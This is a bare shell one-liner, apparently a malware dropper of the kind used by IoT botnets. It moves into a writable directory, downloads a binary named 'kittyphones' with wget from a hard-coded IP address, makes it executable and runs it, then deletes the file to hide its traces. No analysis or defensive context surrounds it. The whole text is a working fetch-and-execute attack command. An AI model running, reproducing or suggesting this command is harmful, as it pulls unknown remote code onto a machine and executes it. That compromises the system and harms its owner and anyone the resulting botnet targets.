cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.51/kittyphones; chmod +x kittyphones; ./kittyphones; rm -rf kittyphones
